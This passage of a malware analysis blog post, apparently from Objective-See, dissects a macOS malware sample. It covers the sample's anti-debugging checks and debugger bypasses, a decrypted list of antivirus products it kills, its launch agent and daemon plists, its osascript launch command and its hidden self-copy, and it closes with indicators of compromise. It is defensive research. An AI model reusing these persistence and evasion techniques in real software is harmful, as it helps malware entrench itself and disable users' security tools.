<p>If the <code>is_debugging</code> function returns 1 (<code>true</code>) the malware will exit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>__text:<span style="color:#ae81ff">000000010000</span>B89A                 call    _is_debugging
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>__text:<span style="color:#ae81ff">000000010000</span>B89F                 cmp     eax, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>__text:<span style="color:#ae81ff">000000010000</span>B8A2                 jz      <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>__text:<span style="color:#ae81ff">000000010000</span>B8A8                 mov     edi, <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>__text:<span style="color:#ae81ff">000000010000</span>B8AD                 call    _exit</span></span></code></pre></div>
<p>To subvert this in a debugger we simply set a breakpoint at <code>0x000000010000B89F</code>, then change the value of the <code>RAX</code> register to 0 (<code>false</code>):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
->  0x10000b89f: cmpl   $0x0, %eax
    0x10000b8a2: je     0x10000b8b2
    0x10000b8a8: movl   $0x1, %edi
    0x10000b8ad: callq  0x10000feb2
Target 0: (patch) stopped.

(lldb) reg read $rax
     rax = 0x0000000000000001
(lldb) reg write $rax 0
(lldb) c

</pre>
</div>
<p>All good? Almost! The malware contains more anti-debugging logic. A function called <code>prevent_trace</code> seeks to prevent tracing (debugging) via call to <code>ptrace</code> with the <code>PTRACE_DENY_ATTACH</code> flag (<code>0x1F</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>__text:<span style="color:#ae81ff">0000000100007</span>C20 _prevent_trace  proc near   
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>__text:<span style="color:#ae81ff">0000000100007</span>C20                 push    rbp
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>__text:<span style="color:#ae81ff">0000000100007</span>C21                 mov     rbp, rsp
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>__text:<span style="color:#ae81ff">0000000100007</span>C24                 call    _getpid
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>__text:<span style="color:#ae81ff">0000000100007</span>C29                 xor     ecx, ecx
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>__text:<span style="color:#ae81ff">0000000100007</span>C2B                 mov     edx, ecx        ; addr
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>__text:<span style="color:#ae81ff">0000000100007</span>C2D                 xor     ecx, ecx        ; data
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>__text:<span style="color:#ae81ff">0000000100007</span>C2F                 mov     edi, <span style="color:#ae81ff">1F</span>h        ; request
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>__text:<span style="color:#ae81ff">0000000100007</span>C34                 mov     esi, eax        ; pid
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>__text:<span style="color:#ae81ff">0000000100007</span>C36                 call    _ptrace
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>__text:<span style="color:#ae81ff">0000000100007</span>C3B                 pop     rbp
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>__text:<span style="color:#ae81ff">0000000100007</span>C3C                 retn
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>__text:<span style="color:#ae81ff">0000000100007</span>C3C _prevent_trace  endp</span></span></code></pre></div>
<p>To bypass this, we simply avoid the call to <code>_prevent_trace</code> all together. However? Simply set a breakpoint on the call to this function, then modify the value of the instruction pointer (<code>RIP</code>) to skip it!</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
(lldb) b 0x000000010000B8B2
Breakpoint 12: where = patch`patch[0x000000010000b8b2], address = 0x000000010000b8b2
(lldb) c
Process 683 resuming
Process 683 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 2.1
  
->  0x10000b8b2: callq  0x100007c20
    0x10000b8b7: leaq   0x7de2(%rip), %rdi
    0x10000b8be: movl   $0x8, %esi
    0x10000b8c3: movl   %eax, -0x38(%rbp)
Target 0: (patch) stopped.

(lldb) reg write $rip 0x10000b8b7
(lldb) c
</pre>
</div>
<p>Easy peasy! Now we can continue our dynamic analysis unperturbed.</p>
<p>As its name suggests, the <code>ei_persistence_main</code> function persists the malware (as a launch agent). However, before persisting it invokes a function named <code>kill_unwanted</code> to kill several well known security products that may detect or block malicious behaviors.</p>
<p>The <code>kill_unwanted</code> function gets a list of running processes, compares each process with a encrypted list of &ldquo;unwanted&rdquo; programs. With our aforementioned breakpoint on the <code>ei_str</code> function, we can dump the decrypted strings, to ascertain the value of the &ldquo;unwanted&rdquo; programs:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

(lldb) x/s $rax
0x100108fd0: "Little Snitch"

(lldb) x/s $rax
0x100100880: "Kaspersky"

(lldb) x/s $rax
0x1001028a0: "Norton"

(lldb) x/s $rax
0x10010a2f0: "Avast"

(lldb) x/s $rax
0x10010a300: "DrWeb"

(lldb) x/s $rax
0x100102eb0: "Mcaffee"

(lldb) x/s $rax
0x100109d20: "Bitdefender"

(lldb) x/s $rax
0x100109d30: "Bullguard"

</pre>
</div>
<p>&hellip;one day, Objective-See&rsquo;s tools will make such a list! HA!</p>
<p>Finally the <code>ei_persistence_main</code> function persists the malware. Specifically it first calls the <code>persist_executable</code> function creates a persistent copy of itself. We can observe this via a file monitor, and/or in the debugger.</p>
<p>First, we observe the malware decrypting various strings related to persistence:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

(lldb) x/s $rax
0x100118fd0: "/Library/AppQuest/com.apple.questd"

(lldb) x/s $rax
0x1001190f0: "%s/Library/AppQuest/com.apple.questd"

</pre>
</div>
<p>If the malware is running with non-root privileges it will write the copy of itself to <code>~/Library/AppQuest/com.apple.questd</code>. However, if running as root, it will also copy itself to <code>/Library/AppQuest/com.apple.questd</code>. This can be observed via a file monitor (such as macOS&rsquo;s <code>fs_usage</code> utility). Here, we see a non-root instance of the malware creating <code>~/Library/AppQuest/com.apple.questd</code> and ensuring it is executable (via <code>chmod</code>):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

# fs_usage -w -f filesystem

open    F=4   /Library/AppQuest/com.apple.questd  toolroomd.67949
write   F=4   B=0x1000  toolroomd.67949
...
close   F=4  toolroomd.67949
chmod   <rwxr-xr-x>  /Library/AppQuest/com.apple.questd  toolroomd.67949


open    F=4  ~/Library/AppQuest/com.apple.questd
write   F=4   B=0x1000  toolroomd.67949
...
close   F=4  toolroomd.67949

chmod   <rwxr-xr-x> ~/Library/AppQuest/com.apple.questd toolroomd.67949 


$ md5 /Library/AppQuest/com.apple.questd
MD5 (/Library/AppQuest/com.apple.questd) = 322f4fb8f257a2e651b128c41df92b1d

$ md5 ~/Library/AppQuest/com.apple.questd
MD5 (/Users/user/Library/AppQuest/com.apple.questd) = 322f4fb8f257a2e651b128c41df92b1d

</pre>
</div>
<p>Once the malware has copied itself, it persists via a launch item. The code that performs this persistence is found in the <code>install_daemon</code> function (address <code>0x0000000100009130</code>), that is invoked via the <code>ei_persistence_main</code> function.</p>
<p>If running as non-root, it persists as a launch agent: <code>~/Library/LaunchAgents/com.apple.questd.plist</code>. Below we dump that arguments passed to the <code>install_daemon</code> &hellip;first, when the malware is installing itself as a launch agent:
`
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

$ lldb /Library/mixednkey/toolroomd

...

* thread #1, stop reason = breakpoint 1.1
frame #0: 0x0000000100009130 toolroomd
->  0x100009130: pushq  %rbp
    0x100009131: movq   %rsp, %rbp
    0x100009134: subq   $0x150, %rsp         
    0x10000913b: movq   %rdi, -0x10(%rbp)

Target 0: (toolroomd) stopped.
(lldb) x/s $rdi
0x7ffeefbffc94: "/Users/user"

(lldb) x/s $rsi
0x100114a20: "%s/Library/AppQuest/com.apple.questd"

(lldb) x/s $rdx
0x100114740: "%s/Library/LaunchAgents/"

</pre>
</div></p>
<p>It uses the arguments to build a path for a launch item (here, launch agent) property list (<code>/Users/user/Library/LaunchAgents/com.apple.questd.plist</code>), as well then configuring said plist.</p>
<p>Continuing the debugging session, we observes the malware decrypted an embedded (template) plist, that is then populated with the path to the persistent binary (e.g. <code>/Users/user/Library/AppQuest/com.apple.questd</code>).</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

x/s $rax
0x100119540: "&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;\n&lt;plist version=&quot;1.0&quot;&gt;\n&lt;dict&gt;\n&lt;key&gt;Label&lt;/key&gt;\n&lt;string&gt;%s&lt;/string&gt;\n\n&lt;key&gt;ProgramArguments&lt;/key&gt;\n&lt;array&gt;\n&lt;string&gt;%s&lt;/string&gt;\n&lt;string&gt;--silent&lt;/string&gt;\n&lt;/array&gt;\n\n&lt;key&gt;RunAtLoad&lt;/key&gt;\n&lt;true/&gt;\n\n&lt;key&gt;KeepAlive&lt;/key&gt;\n&lt;true/&gt;\n\n&lt;/dict&gt;\n&lt;/plist&gt;"

</pre>
</div>
<p>Once the launch agent property list is fully configured in memory the malware writes it out to disk:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

cat /Users/user/Library/LaunchAgents/com.apple.questd.plist 
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;
&lt;plist version=&quot;1.0&quot;&gt;
&lt;dict&gt;
    &lt;key&gt;Label&lt;/key&gt;
    &lt;string&gt;questd&lt;/string&gt;

    &lt;key&gt;ProgramArguments&lt;/key&gt;
    &lt;array&gt;
        &lt;string&gt;/Users/user/Library/AppQuest/com.apple.questd&lt;/string&gt;
        &lt;string&gt;--silent&lt;/string&gt;
    &lt;/array&gt;

    &lt;key&gt;RunAtLoad&lt;/key&gt;
    &lt;true/&gt;

    &lt;key&gt;KeepAlive&lt;/key&gt;
    &lt;true/&gt;

&lt;/dict&gt;
</pre>
</div>
<p>As the <code>RunAtLoad</code> key is set to <code>true</code> the malware (<code>com.apple.questd</code>) will be automatically restarted each time the user logs in.</p>
<p>Of course <a href="https://objective-see.com/products/blockblock.html">BlockBlock</a> detects this persistence attempt 😇</p>
<p><img src="../images/blog/blog_0x59/blockblock.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

If the malware is running with root privileges it will invoke the <code>install_daemon</code> function again, but this time passing in arguments specifying that a launch daemon should be created:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

$ cat /Library/LaunchDaemons/com.apple.questd.plist 
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;
&lt;plist version=&quot;1.0&quot;&gt;
&lt;dict&gt;
    &lt;key&gt;Label&lt;/key&gt;
    &lt;string&gt;questd&lt;/string&gt;

    &lt;key&gt;ProgramArguments&lt;/key&gt;
    &lt;array&gt;
        &lt;string&gt;sudo&lt;/string&gt;
        &lt;string&gt;/Library/AppQuest/com.apple.questd&lt;/string&gt;
        &lt;string&gt;--silent&lt;/string&gt;
    &lt;/array&gt;

    &lt;key&gt;RunAtLoad&lt;/key&gt;
    &lt;true/&gt;

    &lt;key&gt;KeepAlive&lt;/key&gt;
    &lt;true/&gt;

&lt;/dict&gt;
</pre>
</div>
<p>Once the malware has ensured it is persisted (twice, if running as root!), it invokes the <code>ei_selfretain_main</code> to starts the launch item(s). This function invokes the aptly named <code>run_daemon</code> which in turn invokes macOS <code>osascript</code> binary to launch the items. We can observe this via a process monitor, for example, when the malware starts the launch daemon:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

# procInfo

[process start]

pid: 1142
path: /usr/bin/osascript
user: 0
args: (
    osascript,
    "-e",
    "do shell script \"launchctl load -w /Library/LaunchDaemons/com.apple.questd.plist;launchctl start questd\" with administrator privileges"
)

</pre>
</div>
<p>Once the malware was persisted and kicked off the launch items, it invokes a function named <code>create_rescue_executable</code> to create yet another copy of itself. This copy will made in the user&rsquo;s <code>Library</code> directory. Its named starts with a <code>.</code> so that it won&rsquo;t show up in the UI (i.e. <code>Finder.app</code>), and is then followed via 9 random characters. For example: <code>~/Library/.9W4S5dtNK</code>.</p>
<p>The malware also appends a some trailer data to this copy:
<img src="../images/blog/blog_0x59/trailer.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>
</p>
<p>The contents of this file are also saves in global variable named <code>priv_rescue_data</code>, which allows the malware to &lsquo;rescue&rsquo; itself if it deleted from disk (yet still running in memory).
Looking at the cross-references to this variable reveal its (later) references in function such as <code>resque_myself</code> and <code>persist_executable</code></p>
<img src="../images/blog/blog_0x59/rescueMe.png"  width="66%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>&hellip;clearly this malware doesn&rsquo;t want to be removed from an infected system!</p>
<p>Via a process monitor, we can observe the malware then kicking off this &ldquo;configured&rdquo; copy via the <code>launchctl submit -l ...</code> command:</p>
<p><div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

[procInfo] process start:
pid: 737
path: /bin/launchctl
user: 501
args: (
    launchctl,
    submit,
    "-l",
    questd,
    "-p",
    "/Users/user/Library/.9W4S5dtNK"
)


[procInfo] process start:
pid: 738
path: /Users/user/Library/.9W4S5dtNK
user: 0
...

</pre>
</div>
 </p>
<p>So, now the malware has persisted and launched a configured (i.e. with &ldquo;trailer&rdquo; data) instance of itself. What does it appear to do?
Actually a lot!  &hellip; pop over to <a href="blog_0x60.html">part two</a>, to read all about it!</p>
<h3 id="conclusion">Conclusion</h3>
<p>Today, we triaged an interesting piece of new malware - detailing its infection vector, persistence, and anti-analysis logic.</p>
<p>Though new, our (free!) tools such as <a href="https://objective-see.com/products/blockblock.html">BlockBlock</a> and <a href="https://objective-see.com/products/ransomwhere.html">RansomWhere?</a> were able to detect and thwart various aspects of the attack &hellip;with no a priori knowledge!</p>
<img src="../images/blog/blog_0x59/blockblock.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<img src="../images/blog/blog_0x59/ransomwhere.png"  width="50%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>IoCs:</p>
<ul>
<li><code>/Library/mixednkey/toolroomd</code></li>
<li><code>/Library/AppQuest/com.apple.questd</code></li>
<li><code>~/Library/AppQuest/com.apple.questd</code></li>
<li><code>/Library/LaunchDaemons/com.apple.questd.plist</code></li>
<li><code>~/Library/LaunchAgents/com.apple.questd.plist</code></li>
</ul>
<p>Note though if you are infected, due to the malware&rsquo;s viral infection capabilities, it is recommended that one wipes the infected system and fully reinstalls macOS.</p>
<br>
<div class="note">
<center>
❤️ Love these blog posts and/or want to support my research and tools? 
<p>You can support them via my <a href="https://www.patreon.com/bePatron?c=701171">Patreon</a> page!</p>
<p>[<img src="../images/patreon.png"  width="100%" class="center" style="border-radius: 4px;"></p>
<center style="color:#787878; padding-top:5px;"> </center>
](https://www.patreon.com/bePatron?c=701171)
</center>
</div>

</section>

    </div>

    
<script src="/js/cookies.js"></script>
<script src="/social/ss-social.js"></script>
<link href="/social/ss-social.css" rel="stylesheet" />

<script> 
    $(function(){
        
        
        
        if("" == getCookie("acceptedCookies")) 
        {
            console.log('ok showing!')

            document.getElementById("cookies").style.display = "block";
        }

    });
</script>

<script>
function acceptCookies() {

    
    setCookie("acceptedCookies", "yes", 365);

    
    document.getElementById("cookies").style.display = "none";
}
</script>

<br>
<br>
<div id="cookies" class="cookie" style="padding-left:20px;">
    This website uses cookies to improve your experience.
    <div class="cookieButton">
        
        <button class="menuicon button-4" role="button" onclick="acceptCookies()" style="margin-top: 12px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Okay!</button>
    </div>
</div>
<nav role="footer">
<ul>

    <li>
        <a href="mailto:contact@objective-see.com" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#x2709;</span></a>
    </li>

     <li>
        <a href="rss.xml" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xE310;</span></a>
    </li>

    <li>
        <a href="https://www.youtube.com/channel/UCQycc8VDhHuNkZlKSSTDHzw" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xF630;</span></a>
    </li>
   
    <li>
        <a href="https://twitter.com/objective_see" class="menubutton icon"><span class="ss-icon">&#xF611;</span></a>
    </li>
    
    <li>
         <form action="support.html" style="display: inline;">
            <button class="menuicon button-4" role="button" style="margin-top: 7px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Support Us!</button>
        </form>
        
    </li>

    <li>
        <div style="margin-top: 10px;">
        Signup for our <a class="inlineLink" target="_blank" href="http://eepurl.com/bXpXeT">newsletter </a> »
        </div>
    </li>

</ul>
</nav>

  </body>
</html>